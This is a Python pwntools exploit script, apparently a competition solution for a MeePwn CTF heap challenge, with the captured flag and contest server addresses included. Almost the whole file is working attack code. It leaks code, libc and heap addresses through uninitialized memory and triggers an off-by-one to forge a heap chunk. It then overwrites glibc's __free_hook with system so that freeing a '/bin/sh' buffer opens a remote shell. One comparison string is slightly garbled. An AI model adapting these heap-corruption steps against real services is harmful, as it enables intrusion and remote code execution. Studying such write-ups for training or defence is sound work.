#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from pwnpwnpwn import xorstr
import time
#MEEPWNCTF{MAP_FIXED_1s_v3ry_dangerous}
host = "10.211.55.19"
port = 8888
host = "178.128.87.12"
port = 31337
r = remote(host,port)

def register(name,password,desc):
    r.recvuntil("Choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(password)
    r.recvuntil(":\n")
    if len(desc) != 0 :
        r.sendline(desc)

def login(name,password):
    r.recvuntil("Choice:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(password)


def add(name,size,content):
    r.recvuntil("Choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(size))
    time.sleep(0.1)
    r.sendline(content)

def show():
    r.recvuntil("Choice:")
    r.sendline("4")

def edit(idx,size,content):
    r.recvuntil("Choice:")
    r.sendline("3")
    r.recvuntil("?")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":\n")
    r.sendline(content)

def free(idx):
    r.recvuntil("Choice:")
    r.sendline("2")
    r.recvuntil("?")
    r.sendline(str(idx))
    
def logout():
    r.recvuntil("Choice:")
    r.sendline("5")

def sp_add(name,size,content,key,addr):
    add(name,size,content)
    r.send(p64(0x414100000000))
    time.sleep(0.1)
    r.send(p64(addr))
    time.sleep(0.1)
    r.send(key.ljust(0x20,"\x00"))


register("ddaa","nogg","qq")
login("ddaa","nogg")
add("a"*24,0x30,"da")
show()
r.recvuntil("a"*24)
code = u64(r.recvuntil("]")[:-1].ljust(8,"\x00")) - 0x211d
print hex(code)
add("da",0x410,"a"*0x20)

key = "da"
vaild_key = "orange"
data = "a"*128
libc_raw = "a"*8
heap_raw = "b"*8
# I don't find the off-by-one vulnerability, so I use the uninitialized memory to leak address. :(
while (key != vaild_key) or libc_raw[5] != "\x7f" or (heap_raw[5] != "\x55" and heap_raw[5] != "\x56") :
    add("da",0x80,"")
    show()
    r.recvuntil("2 -")
    r.recvuntil("]\n")
    data = r.recvuntil("\n")[:-1]
    key = data[-64:]
    vaild_key = data[-128:-64]
    info  = xorstr(data[:64].decode('hex'),key.decode('hex'))
    libc_raw = info[8:16]
    heap_raw = info[24:32]
    if (key != vaild_key) or libc_raw[5] != "\x7f" or (heap_raw[5] != "\x55" and heap_raw[5] != "\    x56"):
        free(2)


libc = u64(libc_raw) - 0x3ec090
heap = u64(heap_raw) - 0x2c0
print "libc:",hex(libc)
print "heap:",hex(heap)
logout()
register("a","a","ddaa")
register("a","a","ddaa")
# Trigger the off-by-one
register("a","a"*0x20,"")
login("ddaa","nogg")
sp_add("da",0x80,"","",0x414100001000)
fake_chunk = 0x414100000030
payload = p32(0x80) + p32(1) + p64(fake_chunk+0x10)
sp_add("da",0x1000,p64(0) + p64(0x31) +"\x00"*0xfc0 + payload,"/bin/sh\x00",0x414100000000)
free(3)
free_hook = libc + 0x3ed8e8
edit(3,0x30,p64(0) + p64(0x31) + p64(free_hook))
system = libc + 0x4f440
sp_add("d",0x20,"gg",p64(system),0x414200000000)
free(4)
r.interactive()
